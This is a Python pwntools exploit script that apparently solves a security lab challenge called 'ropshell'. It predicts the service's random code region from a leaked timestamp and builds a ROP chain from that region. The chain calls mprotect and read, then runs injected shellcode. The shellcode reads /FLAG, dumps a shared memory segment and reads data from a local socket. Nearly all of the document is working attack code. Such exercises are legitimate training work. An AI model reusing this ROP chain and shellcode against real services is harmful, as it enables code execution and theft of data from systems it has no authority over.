#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil('** Timestamp is ')
time = int(r.recvuntil('\n', drop=True))
print("time: ", time)
r.recvuntil('** Random bytes generated at ')
base_addr = int(r.recvuntil('\n', drop=True), 16)

# feed seed
libc.srand(time)

LEN_CODE = 10*0x10000
codeint = b''
for i in range(LEN_CODE//4):
    codeint += (((libc.rand()<<16) | (libc.rand() & 0xffff)) & 0xffff).to_bytes(4, "little")
syscall_at = libc.rand() % (LEN_CODE//4-1)
# codeint[libc.rand() % (LEN_CODE/4-1)] = 0xc3050f


pop_rax = p64(codeint.find(asm("pop rax\nret"))+base_addr) # b'X\xc3'
pop_rdi = p64(codeint.find(asm("pop rdi\nret"))+base_addr)
pop_rsi = p64(codeint.find(asm("pop rsi\nret"))+base_addr)
pop_rdx = p64(codeint.find(asm("pop rdx\nret"))+base_addr)
syscall = p64(syscall_at*4 + base_addr)
# base_addr = base_addr & 0xfffffffffffff000 + 0x1000
bb = base_addr
base_addr = p64(base_addr)
code_addr = p64(bb+0x100)


wait_to_send = b''

# mprotect
wait_to_send += pop_rax 
wait_to_send += p64(10) 
wait_to_send += pop_rdi
wait_to_send += base_addr
wait_to_send += pop_rsi
wait_to_send += p64(4096)
wait_to_send += pop_rdx
wait_to_send += p64(7)
wait_to_send += syscall

# read data -> for task1: "/FLAG"
wait_to_send += pop_rax
wait_to_send += p64(0)
wait_to_send += pop_rdi
wait_to_send += p64(0)
wait_to_send += pop_rsi
wait_to_send += base_addr
wait_to_send += pop_rdx
wait_to_send += p64(50)
wait_to_send += syscall

# read asm code -> to achieve the tasks
wait_to_send += pop_rax
wait_to_send += p64(0)
wait_to_send += pop_rdi
wait_to_send += p64(0)
wait_to_send += pop_rsi
wait_to_send += code_addr
wait_to_send += pop_rdx
wait_to_send += p64(1000)
wait_to_send += syscall

# print asm read
# wait_to_send += pop_rax
# wait_to_send += p64(1)
# wait_to_send += pop_rdi
# wait_to_send += p64(2)
# wait_to_send += pop_rsi
# wait_to_send += base_addr
# wait_to_send += pop_rdx
# wait_to_send += p64(50)
# wait_to_send += syscall

# execute upload command
wait_to_send += code_addr

# exit
wait_to_send += pop_rax
wait_to_send += p64(60)
wait_to_send += pop_rdi
wait_to_send += p64(37)
wait_to_send += syscall

r.send(wait_to_send)

# task1 data, "/FLAG"
data = p64(0x47414c462f) + p64(0)
r.send(data)
 
codes = """mov rdi, {}      
mov rsi, 0
mov rdx, 0
mov rax, 2                 
syscall

mov rdi, rax                  
mov rsi, rsp
mov rdx, 100
mov rax, 0                 
syscall
mov r8, rax
       
mov rdi, 1
mov rsi, rsp
mov rdx, r8
mov rax, 1               
syscall



mov rdi, 0x1337
mov rsi, 100
mov rdx, 4096
mov rax, 29
syscall 

mov rdi, rax
mov rsi, 0
mov rdx, 4096
mov rax, 30
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 69
mov rax, 1
syscall
              


mov rdi, 2
mov rsi, 1
mov rdx, 0
mov rax, 41
syscall

mov rbx, rax

mov rdi, rbx
mov rsi, {}
mov WORD PTR [rsi], 0x0002
mov WORD PTR [rsi+2], 0x3713
mov DWORD PTR [rsi+4], 0x0100007f
mov QWORD PTR [rsi+8], 0
mov rdx, 16
mov rax, 42
syscall

mov rdi, rbx
mov rsi, {}
mov rdx, 100
mov rax, 0
syscall

mov rdi, 1
mov rsi, {}
mov rdx, 67
mov rax, 1
syscall

mov rdi, 37
mov rax, 60
syscall
""".format(bb, bb, bb+0x30, bb+0x30)
# shm_addr = bb + 0x30

r.send(asm(codes))

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :